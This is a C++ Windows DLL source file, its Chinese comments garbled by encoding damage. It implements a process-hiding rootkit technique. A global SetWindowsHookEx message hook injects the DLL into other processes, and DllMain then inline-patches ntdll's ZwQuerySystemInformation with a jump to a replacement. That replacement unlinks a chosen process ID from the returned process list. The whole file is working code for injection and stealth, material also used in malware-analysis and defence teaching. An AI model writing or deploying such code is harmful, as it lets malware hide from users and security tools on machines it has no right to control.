// dllmain.cpp : ���� DLL Ӧ�ó������ڵ㡣
#include<Windows.h>
#include"HookAPI.h"
#include<tchar.h>

extern HMODULE g_hModule;

#pragma data_seg("mydata")
HHOOK g_hHook = NULL;
#pragma data_seg()
#pragma comment(linker, "/SECTION:mydata,RWS")

BYTE g_OldData32[5] = { 0 };
BYTE g_OldData64[12] = { 0 };

HMODULE g_hModule;
// ��Ϣȫ�ֹ��ӻص�����
LRESULT CALLBACK GetMsgProc(
	int code,       // hook code
	WPARAM wParam,  // removal option  
	LPARAM lParam   // message
)
{
	// �������κβ���������ȫ�ֹ��ӵ�Ŀ�ľ��ǽ���DLLע����ѣ���Ҫ������ڽ��е�API�ҹ�
	return ::CallNextHookEx(g_hHook, code, wParam, lParam);
}

void HookApi()
{
	// ��ȡ ntdll.dll �ļ��ػ�ַ, ��û���򷵻�
	HMODULE hDll = ::GetModuleHandle(_T("ntdll.dll"));
	if (NULL == hDll)
	{
		return;
	}
	// ��ȡ ZwQuerySystemInformation ������ַ
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::GetProcAddress(hDll, "ZwQuerySystemInformation");
	if (NULL == ZwQuerySystemInformation)
	{
		return;
	}
	// 32 λ���޸�ǰ 5 �ֽ�, 64 λ���޸�ǰ 12 �ֽ�
#ifndef _WIN64
	// jmp New_ZwQuerySystemInformation
	// ������λ��e9 _dwOffset(��תƫ��)
	//		addr1 --> jmp _dwNewAddressָ�����һ��ָ��ĵ�ַ����eip��ֵ
	//		addr2 --> ��ת��ַ��ֵ����_dwNewAddress��ֵ
	//		��תƫ�� _dwOffset = addr2 - addr1
	BYTE pData[5] = { 0xe9, 0, 0, 0, 0 };
	DWORD dwOffset = (DWORD)New_ZwQuerySystemInformation - (DWORD)ZwQuerySystemInformation - 5;
	::RtlCopyMemory(&pData[1], &dwOffset, sizeof(dwOffset));
	// ����ǰ 5 �ֽ�����
	::RtlCopyMemory(g_OldData32, ZwQuerySystemInformation, sizeof(pData));
#else
	// mov rax,0x1122334455667788
	// jmp rax
	// �������ǣ�
	//	48 b8 8877665544332211
	//	ff e0
	BYTE pData[12] = { 0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xe0 };
	ULONGLONG ullOffset = (ULONGLONG)New_ZwQuerySystemInformation;
	::RtlCopyMemory(&pData[2], &ullOffset, sizeof(ullOffset));
	// ����ǰ 12 �ֽ�����
	::RtlCopyMemory(g_OldData64, ZwQuerySystemInformation, sizeof(pData));
#endif
	// ����ҳ��ı�������Ϊ �ɶ�����д����ִ��
	DWORD dwOldProtect = 0;
	::VirtualProtect(ZwQuerySystemInformation, sizeof(pData), PAGE_EXECUTE_READWRITE, &dwOldProtect);
	// �޸�
	::RtlCopyMemory(ZwQuerySystemInformation, pData, sizeof(pData));
	// ��ԭҳ�汣������
	::VirtualProtect(ZwQuerySystemInformation, sizeof(pData), dwOldProtect, &dwOldProtect);
}


void UnhookApi()
{
	// ��ȡ ntdll.dll �ļ��ػ�ַ, ��û���򷵻�
	HMODULE hDll = ::GetModuleHandle(_T("ntdll.dll"));
	if (NULL == hDll)
	{
		return;
	}
	// ��ȡ ZwQuerySystemInformation ������ַ
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::GetProcAddress(hDll, "ZwQuerySystemInformation");
	if (NULL == ZwQuerySystemInformation)
	{
		return;
	}
	// ����ҳ��ı�������Ϊ �ɶ�����д����ִ��
	DWORD dwOldProtect = 0;
	::VirtualProtect(ZwQuerySystemInformation, 12, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	// 32 λ�»�ԭǰ 5 �ֽ�, 64 λ�»�ԭǰ 12 �ֽ�
#ifndef _WIN64
	// ��ԭ
	::RtlCopyMemory(ZwQuerySystemInformation, g_OldData32, sizeof(g_OldData32));
#else
	// ��ԭ
	::RtlCopyMemory(ZwQuerySystemInformation, g_OldData64, sizeof(g_OldData64));
#endif

	// ��ԭҳ�汣������
	::VirtualProtect(ZwQuerySystemInformation, 12, dwOldProtect, &dwOldProtect);
}


NTSTATUS New_ZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
)
{
	OutputDebugStringA("New_ZwQuerySystemInformation Call");
	NTSTATUS status = 0;
	PSYSTEM_PROCESS_INFORMATION pCur = NULL, pPrev = NULL;
	// Ҫ���صĽ���PID
	DWORD dwHideProcessId = 4;

	// UNHOOK API
	UnhookApi();

	// ��ȡ ntdll.dll �ļ��ػ�ַ, ��û���򷵻�
	HMODULE hDll = ::GetModuleHandle(_T("ntdll.dll"));
	if (NULL == hDll)
	{
		return status;
	}
	// ��ȡ ZwQuerySystemInformation ������ַ
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::GetProcAddress(hDll, "ZwQuerySystemInformation");
	if (NULL == ZwQuerySystemInformation)
	{
		return status;
	}

	// ����ԭ���� ZwQuerySystemInformation
	status = ZwQuerySystemInformation(SystemInformationClass, SystemInformation,
		SystemInformationLength, ReturnLength);
	if (NT_SUCCESS(status) && 5 == SystemInformationClass)
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		while (TRUE)
		{
			// �ж��Ƿ���Ҫ���صĽ���PID
			if (dwHideProcessId == (DWORD)pCur->UniqueProcessId)
			{
				if (0 == pCur->NextEntryOffset)
				{
					pPrev->NextEntryOffset = 0;
				}
				else
				{
					pPrev->NextEntryOffset = pPrev->NextEntryOffset + pCur->NextEntryOffset;
				}
			}
			else
			{
				pPrev = pCur;
			}

			if (0 == pCur->NextEntryOffset)
			{
				break;
			}
			pCur = (PSYSTEM_PROCESS_INFORMATION)((BYTE *)pCur + pCur->NextEntryOffset);
		}
	}

	// HOOK API
	HookApi();
	OutputDebugStringA("New_ZwQuerySystemInformation End");
	return status;
}
// ����ȫ�ֹ���
HHOOK SetHook()
{
	// ����ȫ�ֹ���
	HHOOK hHook = ::SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, g_hModule, 0);
	if (NULL == hHook)
	{
		return NULL;
	}
	g_hHook = hHook;
	return hHook;
}


// ж��ȫ�ֹ���
BOOL UnsetHook(HHOOK hHook)
{
	if (FALSE == ::UnhookWindowsHookEx(hHook))
	{
		return FALSE;
	}
	return TRUE;
}
BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		HookApi();
		g_hModule = hModule;
		break;
	}
	case DLL_THREAD_ATTACH:
	{
		break;
	}
	case DLL_THREAD_DETACH:
	{
		break;
	}
	case DLL_PROCESS_DETACH:
	{
		UnhookApi();
		break;
	}
	default:
		break;
	}
	return TRUE;
}


